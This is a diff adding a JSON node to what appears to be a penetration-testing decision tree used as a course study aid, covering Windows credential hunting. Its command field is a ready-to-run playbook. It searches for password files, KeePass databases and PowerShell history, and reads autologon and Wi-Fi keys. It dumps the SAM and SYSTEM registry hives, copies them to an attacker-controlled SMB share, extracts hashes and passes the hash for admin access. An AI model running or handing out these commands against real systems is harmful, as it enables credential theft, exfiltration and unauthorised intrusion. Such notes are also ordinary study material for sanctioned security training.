@@ -1,0 +1,22 @@
+{
+  "id": "windows_creds",
+  "phase": "WINDOWS",
+  "title": "Windows Credential Hunting",
+  "body": "Hidden in Plain View (Module 17.1.3): users store passwords in config files, meeting notes, PS history. Always re-enumerate after gaining a new user — permissions change what you can read.",
+  "cmd": "# ── KEEPASS DATABASE ─────────────────────────────────\nGet-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue\n\n# ── XAMPP / WEB SERVER CONFIGS ───────────────────────\nGet-ChildItem -Path C:\\xampp -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue\ntype C:\\xampp\\\\passwords.txt\ntype C:\\xampp\\\\mysql\\\\bin\\\\my.ini\n# my.ini often has plaintext MySQL password + Windows password comment\n\n# ── USER HOME DIRS ───────────────────────────────────\n# Module 17.1.3 pattern — dave found creds in asdf.txt on desktop\nGet-ChildItem -Path C:\\\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.config,*.ps1,*.bat,*.log,*.bak -File -Recurse -ErrorAction SilentlyContinue\n\n# ── BROAD SEARCH ─────────────────────────────────────\nGet-ChildItem -Path C:\\ -Include *pass*,*cred*,*secret*,*vnc*,*.kdbx,*config*,*unattend* -File -Recurse -ErrorAction SilentlyContinue\n\n# cmd style\ndir /s /b C:\\\\Users\\\\*.xml\ndir /s /b C:\\\\Users\\\\*.txt\ndir /s /b C:\\*pass*\n\n# ── PSREADLINE HISTORY ───────────────────────────────\n(Get-PSReadlineOption).HistorySavePath\ntype C:\\\\Users\\\\dave\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt\n# Check ALL users\nGet-ChildItem C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content\n\n# ── POWERSHELL TRANSCRIPTS ───────────────────────────\n# Often contain PSCredential creation with plaintext passwords\nGet-ChildItem -Path C:\\\\Users -Include *transcript* -File -Recurse -ErrorAction SilentlyContinue\nGet-ChildItem C:\\\\Transcripts\\ -ErrorAction SilentlyContinue\ntype C:\\\\Users\\\\Public\\\\Transcripts\\\\transcript01.txt\n\n# ── EVENT VIEWER — SCRIPT BLOCK LOGS (4104) ─────────\n# GUI: Event Viewer -> Apps & Services -> Microsoft -> Windows -> PowerShell -> Operational\n# Filter Current Log -> Event ID: 4104\n# Ctrl+F: password, net user, admin, secret\n# Warning-level events = suspicious — read each one\n# NOTE: GUI method more reliable than CLI for this\n\n# ── SAM / REGISTRY CREDS ─────────────────────────────\n# Winlogon autologon\nreg query \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\" /v DefaultPassword\nreg query \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\" /v DefaultUserName\n\n# Credential Manager\ncmdkey /list\n\n# Wifi passwords\nnetsh wlan show profile\nnetsh wlan show profile \"SSID\" key=clear\n\n# ── SAM DUMP VIA REGISTRY (needs SYSTEM/admin) ──────\n# Save registry hives\nreg save HKLM\\sam sam\nreg save HKLM\\system system\n\n# Transfer to Kali via SMB share:\n# On Kali:\nimpacket-smbserver -smb2support kali . -username user -password pass\n# On Windows:\nnet use Z: \\\\$lhost\\\\kali /user:user pass\ncopy sam z:\ncopy system z:\n\n# Dump hashes on Kali:\nimpacket-secretsdump -sam sam -system system local\n\n# Pass the hash:\nimpacket-psexec Administrator@$ip -hashes :NTLMHASH\n\n# ── RUNAS WITH FOUND CREDS ───────────────────────────\n# Requires GUI (RDP)\nrunas /user:HOSTNAME\\\\targetuser cmd\nrunas /user:HOSTNAME\\\\targetuser powershell\nrunas /savecred /user:HOSTNAME\\\\targetuser powershell",
+  "warn": "Always re-enumerate after gaining access as a new user. Module 17.1.3 chain: dave -> read asdf.txt -> steve creds -> read my.ini -> backupadmin creds -> local admin. Each new user unlocks new files.",
+  "choices": [
+    {
+      "label": "Found password — try it on all users/services",
+      "next": "creds_found"
+    },
+    {
+      "label": "Got new user via runas",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "Check PS history / transcripts",
+      "next": "windows_post_exploit"
+    }
+  ]
+}
